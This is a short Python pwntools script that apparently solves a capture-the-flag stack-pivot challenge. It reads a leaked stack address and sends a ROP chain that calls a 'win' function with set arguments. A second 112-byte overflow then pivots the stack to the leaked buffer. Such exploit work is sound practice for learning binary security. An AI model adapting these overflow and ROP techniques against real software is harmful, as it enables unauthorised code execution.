from pwn import *

context.log_level = 'Error'

io = process("./pivot")

leak = int(io.recvline().strip().split(b'- ')[1],16)

pop_rdi = 0x4012b3
pop_rsi = 0x4012b1
win_addr = 0x401176

payload = p64(0)
payload += p64(pop_rdi)
payload += p64(0xbabecafe)
payload += p64(pop_rsi)
payload += p64(0xcafebabe)
payload += p64(0)
payload += p64(win_addr)

io.sendline(payload)

payload = b'A' * 112
payload += p64(leak)
payload += p64(0x401234)

io.sendline(payload)
io.interactive()
